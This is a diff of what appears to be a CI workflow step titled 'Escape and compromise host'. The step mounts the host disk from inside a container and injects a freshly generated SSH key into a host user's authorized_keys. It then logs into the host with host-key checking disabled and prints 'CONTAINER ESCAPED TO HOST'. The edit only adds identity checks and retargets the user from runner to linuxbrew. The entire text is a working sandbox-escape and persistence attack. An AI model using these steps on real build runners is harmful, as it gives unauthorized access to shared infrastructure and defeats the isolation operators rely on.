@@ -8,6 +8,8 @@ jobs:
       - name: Escape and compromise host
         run: |
           # Mount host filesystem
+          whoami
+          id
           sudo mkdir -p /mnt/host
           sudo mount /dev/sda1 /mnt/host
           
@@ -15,17 +17,17 @@ jobs:
           ssh-keygen -t ed25519 -f /tmp/key -N ""
           
           # Inject SSH key into host
-          sudo mkdir -p /mnt/host/home/runner/.ssh
-          sudo cp /tmp/key.pub /mnt/host/home/runner/.ssh/authorized_keys
-          sudo chown -R 1001:1001 /mnt/host/home/runner/.ssh
-          sudo chmod 700 /mnt/host/home/runner/.ssh
-          sudo chmod 600 /mnt/host/home/runner/.ssh/authorized_keys
+          sudo mkdir -p /mnt/host/home/linuxbrew/.ssh
+          sudo cp /tmp/key.pub /mnt/host/home/linuxbrew/.ssh/authorized_keys
+          sudo chown -R 1001:1001 /mnt/host/home/linuxbrew/.ssh
+          sudo chmod 700 /mnt/host/home/linuxbrew/.ssh
+          sudo chmod 600 /mnt/host/home/linuxbrew/.ssh/authorized_keys
           
           # Get host IP
           HOST_IP=$(hostname -I | awk '{print $1}')
           
           # SSH to host and run commands
-          ssh -i /tmp/key -o StrictHostKeyChecking=no runner@$HOST_IP << 'EOF'
+          ssh -i /tmp/key -o StrictHostKeyChecking=no linuxbrew@$HOST_IP << 'EOF'
           echo "=== CONTAINER ESCAPED TO HOST ==="
           whoami
           hostname
